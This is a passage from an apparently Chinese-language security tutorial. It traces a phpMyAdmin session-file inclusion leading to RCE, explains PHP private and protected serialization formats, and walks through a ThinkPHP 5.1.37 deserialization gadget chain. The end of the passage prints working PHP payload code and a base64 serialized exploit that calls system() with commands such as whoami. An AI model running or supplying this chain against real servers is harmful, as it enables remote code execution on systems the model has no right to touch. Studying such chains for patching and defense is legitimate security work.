跟进来
前面的入口流程就这么多，接下来就是核心分析，打上断点动态debug调试
我们可以看到第一行有getRelationsParam，f7跟进去，我们可以看到该函数是读取sessions的一些数据，如下
然后return回来
然后跟下来是backquote函数，f7进去
进行拼接test和pma__userconfig
然后就往下走到88-92进行拼接sql语句
然后就是93行的fetchSingleRow函数，继续跟进来
这里的config_data获取到了路径
return回来
然后会对config_data表进行json_decode处理
这里会进入一个readConfig函数
然后跳过一些意义不大的函数
到这里会给prefs一个赋值
然后就是给config_data赋值
路径就传过来了
953行会global一个cfg，并传过来config_data
这里就是我们的漏洞点了，如下
我们跟进Util中的getScriptNameForOption函数，如下
Location是database不是server，于是跳过该条件判断，并且注意此时带过来的target是我们的sessions路径
此时可以看到switch中没有能跟路径匹配的
于是原路返回我们的target
进行包含
成功RCE
## **10 反序列化RCE**
接着我们来分析难度较高的反序列化+RCE，因为目前反序列化的文章并不是很多，所以这里先说一下基础概念
先来看一下这段代码，基本的注释我已经在上面写好了，大家过一下就行，现在说一下几个点
1.输出的变量zactest为什么变成了zaczactest？
这是因为定义$zactest的时候用的是private方法，我们看下面这段话
private是私有权限，他只能用在zac类中，但是在序列化后呢，为了表明这个是我独有的，他就必须要在定义的变量之前加上自己的类名
2.zaczactest明明是10个字符，为什么显示12个？
这是因为私有化属性序列化的格式是%00类名%00属性名，类名就是zac，属性名就是zactest，在这当中分别插入两个%00，所以就多出了两个字符，但为啥没显示出来呢？这是因为%00是空白符
3.为什么zac变量前要加上一个*，并且字符数是6
这个同理2，因为是protected方法赋值的$zac，所以它也有相应的格式，protected格式为%00
_%00属性名，这也是为什么zac变量前面要加上一个_ ，并且字符数是6的原因了
4.那除了这两个方法，public有什么特性呢？
前面俩兄弟都有相应的序列化格式，但是public没有，该是多少就是多少，他的特性就是public是公有化的，所以public赋值的变量可以在任何地方被访问
然后就是实例复现，安装thinkphp5.1.37，然后将framework改名为thinkphp放到,tp5.1.37的目录里
https://github.com/top-think/framework/releases/tag/v5.1.37
https://github.com/top-think/think/releases/tag/v5.1.37
因为我对反序列化也不是特别熟悉，所以以下基本完全参照该文章
https://www.cnblogs.com/xueweihan/p/11931096.html
不过稍微修改了一些，比如过程中的一些方法，还有最后的动态审计部分，并且这篇文章中的poc我也是没复现成功，最后找到其他大佬发出来的poc复现成功的（如侵权私聊我）
全局搜索_destruct
可以看到desturct有一个removeFiles，跟进
我们可以看到其中有一个file_exists，那么当filename是一个对象的时候，就会调用toString
全局搜索toString
发现toString里面只有个toJson，继续跟进
发现有个toArray，跟进去
往下翻，看到这几行代码，$this->append的键名是key，name可控
那么188行的realtion呢？跟进getRelation试试
我们可以看到在toArray函数中的第201行，判断!relation，那么想进来这个if里，就要让this->relation
跟下去getAttr
跟进getData
我们只需要让key 这个键，然后让getAttr() 函数486行下面的if 判断都没有，就可以直接使 this->data[$key] ;
那么key 也是可控的(relation 也是可控的
我们接着全局搜索__call
看到了call_user_func_array，发现我们可以完全控制住第一个参数
那么我们现在就需要找到这类函数，比如input
但这里我们只能去找间接调用input的方法，全局搜索$this->input，找到param函数
我们在当前目录搜索哪里调用了param这个函数，看到了isAjax
然后开始进行漏洞复现，首先在
\application\index\controller\Index.php
文件添加一个反序列化入口
然后我们构建一个payload
    append = ["ethan"=>["dir","calc"]];
    $this->data = ["ethan"=>new Request()];
    }
    }
    class Request
    {
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
    // 表单请求类型伪装变量
    'var_method'     => '_method',
    // 表单ajax伪装变量
    'var_ajax'       => '_ajax',
    // 表单pjax伪装变量
    'var_pjax'       => '_pjax',
    // PATHINFO变量名 用于兼容模式
    'var_pathinfo'   => 's',
    // 兼容PATH_INFO获取
    'pathinfo_fetch' => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
    // 默认全局过滤方法 用逗号分隔多个
    'default_filter' => '',
    // 域名根，如thinkphp.cn
    'url_domain_root'=> '',
    // HTTPS代理标识
    'https_agent_name'=> '',
    // IP代理获取标识
    'http_agent_ip'  => 'HTTP_X_REAL_IP',
    // URL伪静态后缀
    'url_html_suffix'=> 'html',
    ];
    function __construct(){
    $this->filter = "system";
    $this->config = ["var_ajax"=>''];
    $this->hook = ["visible"=>[$this,"isAjax"]];
    }
    }
    namespace think\process\pipes;
    use think\model\concern\Conversion;
    use think\model\Pivot;
    class Windows
    {
    private $files = [];
    public function __construct()
    {
    $this->files=[new Pivot()];
    }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    use think\process\pipes\Windows;
    echo base64_encode(serialize(new Windows()));
    /*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/
    ?>
然后php 2.php 生成payload，在id里加个whoami